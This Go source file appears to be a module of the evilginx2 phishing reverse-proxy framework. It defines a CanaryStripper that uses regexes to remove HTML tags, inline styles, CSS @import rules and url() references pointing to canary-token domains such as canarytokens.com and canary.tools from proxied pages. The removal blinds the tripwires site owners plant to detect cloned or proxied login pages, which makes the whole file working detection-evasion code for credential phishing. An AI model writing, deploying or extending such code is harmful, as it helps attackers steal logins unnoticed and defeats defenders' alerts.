package core

import (
	"bytes"
	"regexp"
	"strings"
	"sync"

	"github.com/kgretzky/evilginx2/log"
)

type CanaryStripper struct {
	domains []string
	enabled bool
	mu      sync.RWMutex
	// compiled regexes cached per domain set
	reHtmlTag    *regexp.Regexp
	reCssUrl     *regexp.Regexp
	reCssImport  *regexp.Regexp
	reInlineStyle *regexp.Regexp
	compiled     bool
}

func NewCanaryStripper() *CanaryStripper {
	cs := &CanaryStripper{
		domains: []string{
			"canarytokens.com",
			"canarytokens.org",
			"canary.tools",
			"canarytoken.net",
			"allcanaries.com",
			"thinkst.com",
		},
		enabled:  true,
		compiled: false,
	}
	cs.compilePatterns()
	return cs
}

func (cs *CanaryStripper) AddDomain(domain string) {
	cs.mu.Lock()
	defer cs.mu.Unlock()

	domain = strings.ToLower(strings.TrimSpace(domain))
	if domain == "" {
		return
	}

	// avoid duplicates
	for _, d := range cs.domains {
		if d == domain {
			return
		}
	}

	cs.domains = append(cs.domains, domain)
	cs.compiled = false
	cs.compilePatterns()
	log.Info("canary: added domain to strip list: %s", domain)
}

func (cs *CanaryStripper) IsEnabled() bool {
	cs.mu.RLock()
	defer cs.mu.RUnlock()
	return cs.enabled
}

func (cs *CanaryStripper) SetEnabled(enabled bool) {
	cs.mu.Lock()
	defer cs.mu.Unlock()
	cs.enabled = enabled
	if enabled {
		log.Info("canary: token stripping enabled")
	} else {
		log.Info("canary: token stripping disabled")
	}
}

// buildDomainPattern creates a regex alternation matching any of the known
// canary domains, including wildcarded subdomains. Each domain is escaped
// for regex safety and prefixed with an optional subdomain wildcard.
func (cs *CanaryStripper) buildDomainPattern() string {
	var parts []string
	for _, d := range cs.domains {
		escaped := regexp.QuoteMeta(d)
		// match the domain itself or any subdomain of it
		parts = append(parts, `(?:[a-zA-Z0-9\-]+\.)*`+escaped)
	}
	return `(?:` + strings.Join(parts, "|") + `)`
}

func (cs *CanaryStripper) compilePatterns() {
	dp := cs.buildDomainPattern()

	// HTML tags: <link ...>, <img ...>, <script ...> that reference a canary domain
	// Matches self-closing and non-self-closing variants. Uses (?i) for case-insensitive.
	// The tag must contain an attribute value (href, src, url) pointing to a canary domain.
	cs.reHtmlTag = regexp.MustCompile(
		`(?i)<(?:link|img|script)\b[^>]*(?:href|src)\s*=\s*["'][^"']*(?:https?://)?` + dp + `[^"']*["'][^>]*/?>(?:\s*</(?:link|img|script)>)?`)

	// CSS url() references: url('https://canarytokens.com/...')
	cs.reCssUrl = regexp.MustCompile(
		`(?i)url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)`)

	// CSS @import: @import url('...') or @import '...'
	cs.reCssImport = regexp.MustCompile(
		`(?i)@import\s+(?:url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)\s*;?|['"](?:https?://)?` + dp + `[^'"]*['"]\s*;?)`)

	// Inline style attributes containing canary URLs
	cs.reInlineStyle = regexp.MustCompile(
		`(?i)\s*style\s*=\s*["'][^"']*url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)[^"']*["']`)

	cs.compiled = true
}

// StripCanaries removes canary token references from the response body.
// It inspects the content type to decide which stripping strategies to apply.
func (cs *CanaryStripper) StripCanaries(body []byte, contentType string) []byte {
	cs.mu.RLock()
	enabled := cs.enabled
	cs.mu.RUnlock()

	if !enabled {
		return body
	}

	if !cs.compiled {
		cs.mu.Lock()
		cs.compilePatterns()
		cs.mu.Unlock()
	}

	ct := strings.ToLower(contentType)
	isHTML := strings.Contains(ct, "text/html")
	isCSS := strings.Contains(ct, "text/css")

	if !isHTML && !isCSS {
		return body
	}

	stripped := false
	result := body

	if isHTML {
		result, stripped = cs.stripHTML(result, stripped)
	}

	if isCSS || isHTML {
		result, stripped = cs.stripCSS(result, stripped)
	}

	if stripped {
		log.Warning("canary: stripped canary token references from response (%s)", ct)
	}

	return result
}

func (cs *CanaryStripper) stripHTML(body []byte, alreadyStripped bool) ([]byte, bool) {
	stripped := alreadyStripped

	// Strip <link>, <img>, <script> tags referencing canary domains
	if cs.reHtmlTag.Match(body) {
		matches := cs.reHtmlTag.FindAll(body, -1)
		for _, m := range matches {
			log.Warning("canary: stripping HTML tag: %s", truncate(string(m), 120))
		}
		body = cs.reHtmlTag.ReplaceAll(body, []byte("<!-- canary stripped -->"))
		stripped = true
	}

	// Strip inline style attributes containing canary URLs
	if cs.reInlineStyle.Match(body) {
		matches := cs.reInlineStyle.FindAll(body, -1)
		for _, m := range matches {
			log.Warning("canary: stripping inline style with canary URL: %s", truncate(string(m), 120))
		}
		body = cs.reInlineStyle.ReplaceAll(body, []byte(""))
		stripped = true
	}

	return body, stripped
}

func (cs *CanaryStripper) stripCSS(body []byte, alreadyStripped bool) ([]byte, bool) {
	stripped := alreadyStripped

	// Strip @import rules referencing canary domains
	if cs.reCssImport.Match(body) {
		matches := cs.reCssImport.FindAll(body, -1)
		for _, m := range matches {
			log.Warning("canary: stripping CSS @import: %s", truncate(string(m), 120))
		}
		body = cs.reCssImport.ReplaceAll(body, []byte("/* canary stripped */"))
		stripped = true
	}

	// Strip url() references to canary domains
	if cs.reCssUrl.Match(body) {
		matches := cs.reCssUrl.FindAll(body, -1)
		for _, m := range matches {
			log.Warning("canary: stripping CSS url(): %s", truncate(string(m), 120))
		}
		body = cs.reCssUrl.ReplaceAll(body, []byte("url('about:blank')"))
		stripped = true
	}

	return body, stripped
}

// HasCanary checks whether the body contains any references to known canary domains
// without modifying it. Useful for detection-only scenarios.
func (cs *CanaryStripper) HasCanary(body []byte) bool {
	cs.mu.RLock()
	enabled := cs.enabled
	cs.mu.RUnlock()

	if !enabled {
		return false
	}

	dp := cs.buildDomainPattern()
	re := regexp.MustCompile(`(?i)(?:https?://)?` + dp)
	return re.Match(body)
}

// GetDomains returns a copy of the current canary domain list.
func (cs *CanaryStripper) GetDomains() []string {
	cs.mu.RLock()
	defer cs.mu.RUnlock()
	out := make([]string, len(cs.domains))
	copy(out, cs.domains)
	return out
}

// truncate shortens a string to maxLen, appending "..." if truncated.
func truncate(s string, maxLen int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", "")
	s = compactSpaces(s)
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// compactSpaces collapses runs of whitespace into a single space.
func compactSpaces(s string) string {
	var buf bytes.Buffer
	prevSpace := false
	for _, r := range s {
		if r == ' ' || r == '\t' {
			if !prevSpace {
				buf.WriteByte(' ')
				prevSpace = true
			}
		} else {
			buf.WriteRune(r)
			prevSpace = false
		}
	}
	return buf.String()
}
